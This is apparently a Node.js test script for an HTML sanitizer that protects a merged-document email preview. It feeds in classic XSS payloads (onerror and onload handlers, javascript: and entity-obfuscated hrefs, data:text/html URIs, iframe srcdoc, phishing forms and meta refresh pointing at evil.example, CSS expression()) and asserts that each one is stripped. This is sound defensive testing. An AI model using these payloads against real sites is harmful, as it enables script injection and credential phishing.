/**
 * Pure-Node check for sanitizePreviewHtml (c/docGenUtils), the hardening step in front of
 * every innerHTML write of merged-document HTML (the Send Email preview).
 *
 * No org, no browser: jsdom supplies `document`. Run it before touching the sanitizer:
 *
 *   node scripts/qa/preview-sanitizer-check.mjs
 *
 * The attack strings are the ones that matter for this preview: the merge does NOT
 * HTML-escape record values, so anything a user can type into a merged field arrives here raw.
 */
import { JSDOM } from 'jsdom';
import { readFileSync, writeFileSync, mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const here = dirname(fileURLToPath(import.meta.url));
const src = readFileSync(join(here, '../../force-app/main/default/lwc/docGenUtils/docGenUtils.js'), 'utf8');
const dir = mkdtempSync(join(tmpdir(), 'pvsan-'));
const file = join(dir, 'docGenUtils.mjs');
writeFileSync(file, src);

globalThis.document = new JSDOM('<!DOCTYPE html><html><body></body></html>').window.document;
const { sanitizePreviewHtml } = await import(pathToFileURL(file).href);

let pass = 0;
let fail = 0;
const t = (name, ok, detail = '') => {
    if (ok) {
        pass++;
    } else {
        fail++;
        console.log('FAIL:', name, detail);
    }
};
const clean = (html) => sanitizePreviewHtml(html);
const has = (html, re) => re.test(html);

// ----- must be removed -----
let o = clean('<h1><img src=x onerror=document.body.dataset.xss=1>Probe</h1>');
t('unquoted onerror (the probe from the org)', !has(o, /onerror/i) && has(o, /<img/i), o);
o = clean('<img src="x" onerror="alert(1)">');
t('quoted onerror', !has(o, /onerror/i), o);
o = clean('<div ONMOUSEOVER=alert(1) OnClick="x()">a</div>');
t('mixed-case handlers', !has(o, /onmouseover|onclick/i), o);
o = clean('<svg onload=alert(1)><circle r=1 /></svg>');
t('svg with onload is dropped entirely', !has(o, /svg|onload|circle/i), o);
o = clean('<a href="javascript:alert(1)">x</a>');
t('javascript: href', !has(o, /javascript/i), o);
o = clean('<a href="  JaVa\tScRiPt:alert(1)">x</a>');
t('javascript: with case, tab and spaces', !has(o, /script:/i), o);
o = clean('<a href="&#106;avascript:alert(1)">x</a>');
t('javascript: via HTML entity', !has(o, /script:/i), o);
o = clean('<a href="vbscript:msgbox(1)">x</a>');
t('vbscript: href', !has(o, /vbscript/i), o);
o = clean('<img src="data:text/html;base64,PHNjcmlwdD4=">');
t('data:text/html src', !has(o, /data:text/i), o);
o = clean('<img src="data:image/svg+xml;base64,PHN2Zz4=">');
t('data:image/svg+xml src (svg can carry script)', !has(o, /data:image\/svg/i), o);
o = clean('<script>alert(1)</script><p>after</p>');
t('script element', !has(o, /<script/i) && has(o, /after/), o);
o = clean('<iframe src="https://evil.example"></iframe><iframe srcdoc="<script>1</script>"></iframe>');
t('iframes incl. srcdoc', !has(o, /iframe|srcdoc/i), o);
o = clean('<object data="x"></object><embed src="x"><applet code="x"></applet>');
t('object / embed / applet', !has(o, /object|embed|applet/i), o);
o = clean('<form action="https://evil.example"><input name=pw><button>Go</button></form>');
t('form, input and button (phishing forms)', !has(o, /<form|<input|<button/i), o);
o = clean(
    '<base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example"><link rel=stylesheet href=x>'
);
t('base / meta refresh / link', !has(o, /<base|<meta|<link/i), o);
o = clean('<p style="width:expression(alert(1))">x</p>');
t('css expression() in a style attribute', !has(o, /expression/i), o);
o = clean('<p style="background:url(javascript:alert(1))">x</p>');
t('javascript: inside a style attribute', !has(o, /javascript/i), o);
o = clean('<style>@import url(https://evil.example/x.css); p { color: red }</style><p>x</p>');
t('css @import removed, rest of the rule kept', !has(o, /@import/i) && has(o, /color:\s*red/), o);
o = clean('<style>p { behavior: url(x.htc); color: red }</style>');
t('css behavior removed', !has(o, /behavior/i), o);
o = clean('<img src=x srcset="javascript:alert(1) 1x">');
t('srcset dropped', !has(o, /srcset/i), o);
o = clean('<a href="https://ok.example" ping="https://evil.example/track">x</a>');
t('ping attribute dropped', !has(o, /ping=/i), o);
t('empty input', clean('') === '' && clean(null) === '' && clean(undefined) === '');

// ----- must survive, or the preview stops looking like the document -----
o = clean(
    '<html><head><style>td{border:1px solid #ddd}</style></head><body><table><tr><th>Field</th></tr><tr><td>Name</td></tr></table></body></html>'
);
t(
    'tables and the template stylesheet survive',
    has(o, /<table/i) && has(o, /<th>Field/i) && has(o, /border:\s*1px solid #ddd/),
    o
);
o = clean('<img src="data:image/png;base64,iVBORw0KGgo=" alt="">');
t('inline PNG data URI (the watermark) survives', has(o, /data:image\/png/i), o);
o = clean('<img src="/sfc/servlet.shepherd/version/download/068000000000001">');
t('relative image URL survives', has(o, /\/sfc\/servlet/), o);
o = clean(
    '<a href="https://ok.example/x?y=1">x</a><a href="mailto:a@b.co">m</a><a href="tel:+15550100">t</a><a href="#top">h</a>'
);
t(
    'http(s), mailto, tel and fragment links survive',
    has(o, /https:\/\/ok/) && has(o, /mailto:/) && has(o, /tel:/) && has(o, /#top/),
    o
);
o = clean('<p style="color:#123456;font-size:12pt">x</p>');
t('ordinary inline styles survive', has(o, /color:\s*#123456/), o);
o = clean('<div class="docgen-preview-wrap"><div class="docgen-running-header">H</div><h1>T</h1></div>');
t('preview wrapper classes survive', has(o, /docgen-preview-wrap/) && has(o, /docgen-running-header/), o);

console.log(`preview-sanitizer-check: PASS ${pass}  FAIL ${fail}`);
process.exit(fail ? 1 : 0);
